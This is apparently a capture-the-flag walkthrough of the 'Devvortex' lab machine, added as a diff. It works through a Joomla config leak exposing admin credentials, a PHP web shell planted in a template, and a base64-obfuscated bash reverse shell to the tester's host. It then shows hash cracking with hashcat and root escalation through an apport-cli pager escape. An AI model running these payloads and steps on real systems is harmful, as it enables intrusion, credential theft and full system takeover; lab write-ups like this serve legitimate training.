@@ -1,0 +1,86 @@
+devvortex
+
+	upon scanning the dirs and ports, and manually looking through the website nothing seems vulnerable
+
+	nginx 1.18 doesn't seem vulnerable to anything cool either
+
+	subdomains?
+
+	/etc/dnsmasq.conf
+	address=/.devvortex.htb/10.10.11.242 # add all RHOST subdomains to the resolver
+ 	server=1.1.1.1 # resolve all other traffic through cloudflare dns
+
+	ffuf -w /usr/share/wordlists/dirb/common.txt -u http://FUZZ.devvortex.htb -mc 200 
+	finds dev.devvortex.htb
+
+	dev.devvortex.htb/robots.txt
+		reveals this is running joomla
+
+	dev.devvortex.htb/administrator/manifests/files/joomla.xml
+		reveals the version is 4.2.6
+
+	https://www.google.com/search?q=joomla+4.2.6+vulnerability
+
+	leads to https://vulncheck.com/blog/joomla-for-rce
+
+	which gives this poc:
+		curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true | python -m json.tool | less
+
+	from which we get admin user:
+		lewis
+		P4ntherg0t1n5r3c0n##
+
+	https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla
+
+	in the admin panel we go to templates/cassiopea and replace everything from the error.php to this:
+		<?php
+		$res = system($_GET['cmd']);
+		print $res;
+		?>
+
+	injecting a shell oneliner after nc -l gives shell
+		echo${IFS}YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIvMTMzNyAgMD4mMSA=|base64${IFS}-d|bash
+
+	linpeas doesn't give anything interesting, connecting to mysql (db is joomla, user is the same as in admin dashboard)
+
+	show tables
+	select * from sd4fg_users;
+
+	lewis $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
+	logan $2y$10$LkpjvjCt4i4TECpBRaIuP.joPQmsG2uYfCgjc7cLUE88iT5b/YlGW
+
+	ls /home shows logan
+
+	hashid on logan's hash gives bcrypt
+	hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
+	tequieromucho
+	cat user.txt
+
+	ssh logan
+	sudo -l
+
+	/usr/bin/apport-cli
+
+	vi on this, looks like it's made by canonical
+
+	apport-cli --help 
+	apport-cli -v
+		2.20.11
+
+	googling this reveals https://nvd.nist.gov/vuln/detail/CVE-2023-1326
+
+	so we need to open a .crash file
+
+	/var/crash is empty
+	1/0 in /tmp/test.py doesn't write to /var/crash
+	nothing in /usr/bin seems easily crashable
+
+    googling ubuntu filetype:crash
+	gives this https://launchpadlibrarian.net/304735849/_usr_sbin_smbd.0.crash
+
+	saving this in /tmp and running sudo apport-cli /tmp/_usr_sbin_smbd.0.crash
+	V opens less like the vulnreport said
+
+	!cat /root/root.txt
+
+	gg
